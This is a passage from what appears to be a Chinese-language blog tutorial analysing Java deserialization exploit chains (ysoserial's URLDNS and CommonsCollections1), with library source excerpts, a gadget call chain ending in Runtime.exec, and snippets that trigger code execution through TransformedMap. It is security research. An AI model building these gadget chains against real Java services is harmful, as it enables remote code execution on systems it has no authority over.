<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeA</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;D:\\program\\java\\javasec\\ysoserial-master\\2.ser&quot;</span>)));<br>            ois.readObject();<br>            ois.close();<br>            System.out.println(<span class="hljs-string">&quot;URLDNS is cached&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>Ëß¶ÂèëÂü∫Êú¨ÈÉΩÂæàÁ®≥ÂÆöÔºå‰ΩÜÊòØÂÜç‰∏ÄÊ¨°ÂèçÂ∫èÂàóÂåñÂ∞±‰∏ç‰ºöË¢´ dnslog ËÆ∞ÂΩïÂà∞ÔºåÊç¢‰∏Ä‰∏™Âπ≥Âè∞ÂàôÂèàÂèØ‰ª•ÔºåÊöÇÊó∂‰∏çÊ∏ÖÊ•öÊòØÂê¶‰∏éÁºìÂ≠òÊúâÂÖ≥</p>
</blockquote>
<p>‰∏äËæπÊòØÂà©Áî®‰∫ÜÂèçÂ∞Ñ‰øÆÊîπÂ±ûÊÄßÁöÑÊñπÂºèÔºåÂÜçÁúãÁúã‰∏ÄÂºÄÂßãÂ±ïÁ§∫ ysoserial ÁöÑÁîüÊàê Payload</p>
<p>Âú®<code>GeneratePayload</code>Ë∞ÉÁî® URLDNS ÂØπË±°‰∏≠ÁöÑ<code>getObject</code>ÊñπÊ≥ïÔºö</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getHostAddress:</span><span class="hljs-number">84</span>, URLDNS<span class="hljs-number">$SilentURLStreamHandler</span> (ysoserial.payloads) //Á©∫ÂÆûÁé∞Ôºå‰∏çËØ∑Ê±ÇDNS<br><span class="hljs-symbol">hashCode:</span><span class="hljs-number">359</span>, URLStreamHandler (java.net)<br><span class="hljs-symbol">hashCode:</span><span class="hljs-number">885</span>, URL (java.net)<br><span class="hljs-symbol">hash:</span><span class="hljs-number">339</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">612</span>, HashMap (java.util)<br><span class="hljs-symbol">getObject:</span><span class="hljs-number">57</span>, URLDNS (ysoserial.payloads)<br><span class="hljs-symbol">main:</span><span class="hljs-number">34</span>, GeneratePayload (ysoserial)<br></code></pre></td></tr></table></figure>

<p>Ë∞ÉÁî®ÁªßÊâøÂ≠êÁ±ªÁöÑÈáçÂÜôÊñπÊ≥ï<code>SilentURLStreamHandler.getHostAddress</code>ÔºåËøîÂõû‰∫Ü null ÂÄºÔºåÂõ†Ê≠§‰∏çËß¶Âèë DNS ËØ∑Ê±Ç(ÂÖ∂‰∏≠Â∫èÂàóÂåñÊó∂ handler ÊòØ<strong>transient</strong>‰øÆÈ•∞ÁöÑÔºåÂõ†Ê≠§‰∏ç‰ºöÂ≠òÂÇ®Âú®Â∫èÂàóÂåñÊï∞ÊçÆ‰∏≠ÔºõËÄåÂèçÂ∫èÂàóÂåñË∞ÉÁî®ÁöÑÊó∂ÈªòËÆ§ÁöÑ handlerÔºå‰πüÊ≤°ÊúâÈáçÂÜôÁöÑ<code>getHostAddress</code>ÊñπÊ≥ïÔºå‰πüÂ∞±‰∏çÂΩ±ÂìçËøõË°å DNS ËØ∑Ê±Ç)</p>
<p>Âè¶Â§ñËøòÈáçÂÜô‰∫Ü<code>openConnection</code>ÊòØÂõ†‰∏∫ÁªßÊâøÁöÑ<code>URLStreamHandler</code>ÊòØÊäΩË±°Á±ªÔºåÂõ†Ê≠§ÂøÖÈ°ªÈáçÂÜôÊâÄÊúâ(‰πüÂ∞±‰∏Ä‰∏™)ÊäΩË±°ÊñπÊ≥ï</p>
<h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h3 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂"><a href="#ÈôêÂà∂" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk1.7 &lt; 8u71</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ"><a href="#Âà©Áî®Èìæ" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>		<span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª"><a href="#ÂÖ≥ÈîÆÁ±ª" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer<br>ConstantTransformer<br>InvokerTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure>

<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>‰ΩúÁî®ÂæàÁÆÄÂçïÔºåÂæÄËøô‰∏™Á±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞‰º†ÂÖ•‰∏Ä‰∏™ ObjectÔºåÁÑ∂ÂêéÈáçÂÜôÁöÑ transform ‰ºöËøîÂõûËøô‰∏™ ObjectÔºåÂêéÈù¢ËØ¥Âà∞ÁöÑ<code>TransformerMap.decorate(Map,Transformer,Transformer).put(&quot;a&quot;,&quot;b&quot;)</code>ËøîÂõûÁöÑÂ∞±‰∏çÊòØÂ≠óÁ¨¶‚Äùa b‚ÄùËÄåÊòØ<code>Runtime.getRuntime()</code></p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>Ë∑üËøõÊ∫êÁ†Å‰πüÂæàÂÆπÊòìÁêÜËß£ÔºåÂæÄÊûÑÈÄ†ÂáΩÊï∞‰º†ÂÖ•ÊñπÊ≥ïÂêçÔºåÂèÇÊï∞Á±ªÂûãÔºåÂèÇÊï∞ÂàóË°®ÔºåÈáçÂÜôÁöÑ transform ÂèçÂ∞ÑËøõË°å‰∫ÜÂëΩ‰ª§ÊâßË°å</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class cls = input.getClass();<br>            Method method = cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>()&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><blockquote>
<p>ÂØºÂÖ•ÁöÑÊòØ<code>org.apache.commons.collections.Transformer</code>ÔºåËÄå‰∏çÊòØ<code>javax.xml.transform.Transformer;</code></p>
</blockquote>
<p><code>Transformer</code>ÊòØ‰∏Ä‰∏™Êé•Âè£ÔºåÂè™Êúâ‰∏Ä‰∏™ÊñπÊ≥ï<code>public Object transform(Object input);</code></p>
<p>ÈÄöËøá<code>Transformer</code>Êï∞ÁªÑÂ≠òÂÇ®‰∫Ü<code>ConstantTransformer„ÄÅInvokerTransformer</code>ÂÆû‰æãÂØπË±°Ôºå<code>ConstantTransformer„ÄÅInvokerTransformer</code>ÂùáÂÆûÁé∞‰∫ÜÂèØÂ∫èÂàóÂåñÊé•Âè£ÔºåÂπ∂‰∏îÈÉΩÈáçÂÜô‰∫Ü<code>transform</code>Ëøô‰∏™ÊñπÊ≥ï</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>‰πüÂÆûÁé∞‰∫Ü<code>Transformer</code>Êé•Âè£ÔºåÂèØ‰ª•Â∞ÜÂ§ö‰∏™<code>Transformer</code>ÂØπË±°‰∏≤Âú®‰∏ÄËµ∑Ôºå<code>ChainedTransformer</code>ÊûÑÈÄ†ÂáΩÊï∞Êé•ÂèóÁöÑÊòØ<code>Transformer</code>Êï∞ÁªÑ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>Ë¥¥‰∏Ä‰∏ã p ÁâõÁöÑÂõæ</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220820153609531.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="TransformerMap"><a href="#TransformerMap" class="headerlink" title="TransformerMap"></a>TransformerMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(map);<br>        <span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">put</span><span class="hljs-params">(Object key, Object value)</span> </span>&#123;<br>        key = transformKey(key);<br>        value = transformValue(value);<br>        <span class="hljs-keyword">return</span> getMap().put(key, value);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformKey</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformValue</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÂèØËßÅËøô‰∏™Á±ªÁî®‰∫é‰øÆÈ•∞ MapÔºå‰øÆÈ•∞ËøáÁöÑ Map Âú®Ê∑ªÂä†Êñ∞ÂÖÉÁ¥†ÁöÑÊó∂ÂÄôÂèØ‰ª•ÊâßË°å‰∏Ä‰∏™ÂõûË∞É</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<span class="hljs-comment">//decorateË∞ÉÁî®‰∫ÜÊûÑÈÄ†ÂáΩÊï∞ÔºåËµãÂÄºvalueTransformerÔºåkeyTransformer</span><br><br><span class="hljs-comment">//1.TransformedMap.decorate.putËß¶Âèë</span><br>decorate.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//Èöè‰æøÊ∑ªÂä†Êñ∞ÂÖÉÁ¥†Ëß¶Âèë‰º†ÂÖ•ÁöÑÔºå‰∏äÈù¢ÊòØkeyTransformer‰∏∫nullÔºåÈÇ£‰πàÂ∞ÜÊòØË∞ÉÁî®valueTransformer.transformÊñπÊ≥ï(put(&quot;a&quot;,&quot;b&quot;)ÔºåtransformKeyÂíåtransformValueÈÉΩ‰ºöÂéªË∞ÉÁî®ÔºåÂõ†Ê≠§Â°´ÂÖ•decorateÊñπÊ≥ïÁöÑÂèÇÊï∞È°∫Â∫è‰∏çÂΩ±ÂìçÊúÄÁªàÁöÑÁªìÊûú)ÔºåÂç≥Ê≠§Êó∂Ëß¶ÂèëTransformedMap.transformÔºåËøõËÄåË∞ÉÁî®chainedTransformer.transformÔºåÊúÄÂêéTransformerÊï∞ÁªÑÂÖÉÁ¥†‰∏Ä‰∏™‰∏™Ë∞ÉÁî®transformÊñπÊ≥ïÔºåÊàêÂäüRCE</span><br><br><span class="hljs-comment">//2.‰øÆÊîπvalueËß¶Âèë</span><br>hashMap.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//ÂøÖÈ°ªË¶ÅÂÖàÂ≠òÂÖ•ÈöèÊÑèÁöÑÈîÆÂÄºÂØπÔºå‰∏ãÈù¢‰∏§Ë°å‰ª£Á†Å‰øÆÊîπËøô‰∏™ÈîÆÂÄºÂØπÁöÑÂÄºËß¶Âèë</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure>

<h4 id="Âä®ÊÄÅ‰ª£ÁêÜ"><a href="#Âä®ÊÄÅ‰ª£ÁêÜ" class="headerlink" title="Âä®ÊÄÅ‰ª£ÁêÜ"></a>Âä®ÊÄÅ‰ª£ÁêÜ</h4><h5 id="API"><a href="#API" class="headerlink" title="API"></a>API</h5><p>Â∞±ÂÉèÁ†îÁ©∂ÂèçÂ∫èÂàóÂåñ‰∏ÄÊ†∑ÔºåÊàë‰ª¨ÂèØ‰ª•Ëá™ÂÆö‰πâ<code>writeObject</code>ÔºåÂÜôÂÖ•Êàë‰ª¨ÊÉ≥Ë¶ÅÂÜôÂÖ•ÁöÑÔºõÂä®ÊÄÅ‰ª£ÁêÜÈÄöËøá Java ÁöÑÂèçÂ∞ÑÊú∫Âà∂ÔºåÂä´ÊåÅÂà∞ÊâÄÊåÅÊúâÁöÑÂßîÊâòÁ±ªÂØπË±°ÁöÑÁõ∏ÂÖ≥ÊñπÊ≥ïÔºåÊàê‰∏∫ÁâπÂÆöÁöÑÊúçÂä°ÔºõËøôÊ†∑ÂÅö‰∏ÄÊòØÈöîÁªù‰∫ÜÁõ¥Êé•Ë∞ÉÁî®Áõ∏ÂÖ≥‰∏öÂä°Á±ªÁöÑÊñπÊ≥ïÊàñËÄÖÊØîÈùôÊÄÅ‰ª£ÁêÜ(‰ª£Á†ÅÂÜôÊ≠ª)Êõ¥Âä†ÁÅµÊ¥ªÔºåÈÄöËøá‰ª£ÁêÜÁ±ªÊù•Ë∞ÉÁî®‰∏Ä‰∫õÊñπÊ≥ïÔºõ‰πüÂèØ‰ª•Ëá™ÂÆö‰πâ‰∏Ä‰∫õÊñπÊ≥ïÂú®ÂÖ∂‰∏≠ÔºàÈù¢ÂêëÂàáÈù¢ÁºñÁ®ãÔºöÂàáÂÖ•ÁÇπÂâçÊâßË°å aaaÔºåÂàáÂÖ•ÁÇπÂêéÊâßË°å bbbÔºâÔºåËøôÊ†∑ÂèØ‰ª•ÂÆåÊàêÂØπÁ®ãÂ∫èÁöÑÊó†‰æµÂÖ•ÂºèÊâ©Â±ï</p>
<p><strong>Java Âä®ÊÄÅ‰ª£ÁêÜ‰∏ªË¶Å‰ΩøÁî®Âú∫ÊôØÔºö</strong></p>
<ol>
<li>ÁªüËÆ°ÊñπÊ≥ïÊâßË°åÊâÄËÄóÊó∂Èó¥</li>
<li>Âú®ÊñπÊ≥ïÊâßË°åÂâçÂêéÊ∑ªÂä†Êó•Âøó</li>
<li>Ê£ÄÊµãÊñπÊ≥ïÁöÑÂèÇÊï∞ÊàñËøîÂõûÂÄº</li>
<li>ÊñπÊ≥ïËÆøÈóÆÊùÉÈôêÊéßÂà∂</li>
<li>ÊñπÊ≥ï<code>Mock</code>ÊµãËØï</li>
</ol>
<h6 id="java-lang-reflect-Proxy"><a href="#java-lang-reflect-Proxy" class="headerlink" title="java.lang.reflect.Proxy"></a>java.lang.reflect.Proxy</h6><p>ÁîüÊàêÂä®ÊÄÅ‰ª£ÁêÜÁ±ªÔºåÂàõÂª∫‰ª£ÁêÜÁ±ªÂÆû‰æãÔºåÂÆûÁé∞‰∫Ü<code>Serializable</code>Êé•Âè£</p>
<p>‰∏ªË¶ÅÊñπÊ≥ïÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Creator: yz</span><br><span class="hljs-comment"> * Date: 2020/1/15</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br><br>  <span class="hljs-comment">// ÁúÅÂéªÊàêÂëòÂèòÈáèÂíåÈÉ®ÂàÜÁ±ªÊñπÊ≥ï...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Ëé∑ÂèñÂä®ÊÄÅ‰ª£ÁêÜÂ§ÑÁêÜÁ±ªÂØπË±°</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy ËøîÂõûË∞ÉÁî®Â§ÑÁêÜÁ®ãÂ∫èÁöÑ‰ª£ÁêÜÂÆû‰æã</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ‰ª£ÁêÜÂÆû‰æãÁöÑË∞ÉÁî®Â§ÑÁêÜÁ®ãÂ∫è</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException Â¶ÇÊûúÂèÇÊï∞‰∏çÊòØ‰∏Ä‰∏™‰ª£ÁêÜÂÆû‰æã</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ÂàõÂª∫Âä®ÊÄÅ‰ª£ÁêÜÁ±ªÂÆû‰æã</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     ÊåáÂÆöÂä®ÊÄÅ‰ª£ÁêÜÁ±ªÁöÑÁ±ªÂä†ËΩΩÂô®</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces ÊåáÂÆöÂä®ÊÄÅ‰ª£ÁêÜÁ±ªÁöÑÁ±ªÈúÄË¶ÅÂÆûÁé∞ÁöÑÊé•Âè£Êï∞ÁªÑ</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          Âä®ÊÄÅ‰ª£ÁêÜÂ§ÑÁêÜÁ±ª</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ËøîÂõûÂä®ÊÄÅ‰ª£ÁêÜÁîüÊàêÁöÑ‰ª£ÁêÜÁ±ªÂÆû‰æã</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException ‰∏çÊ≠£Á°ÆÁöÑÂèÇÊï∞ÂºÇÂ∏∏</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ÂàõÂª∫Âä®ÊÄÅ‰ª£ÁêÜÁ±ª</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     